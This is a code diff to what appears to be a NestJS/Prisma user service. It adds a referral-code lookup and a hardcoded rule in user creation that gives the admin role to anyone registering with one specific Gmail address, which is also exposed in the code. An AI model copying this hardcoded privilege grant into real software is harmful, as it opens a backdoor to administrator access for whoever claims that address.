@@ -22,6 +22,10 @@ export class UsersService {
     return this.prisma.user.findUnique({ where: { waNumber } });
   }
 
+  async findOneByReferralCode(referralCode: string): Promise<User | null> {
+    return this.prisma.user.findUnique({ where: { referralCode } });
+  }
+
   async create(data: Prisma.UserCreateInput): Promise<User> {
     const existing = await this.findOneByEmail(data.email);
     if (existing) {
@@ -32,6 +36,9 @@ export class UsersService {
       if (existingWa) {
         throw new ConflictException('WhatsApp number already in use.');
       }
+    }
+    if (data.email === 'studia6ma@gmail.com') {
+      data.role = 'admin';
     }
     return this.prisma.user.create({ data });
   }
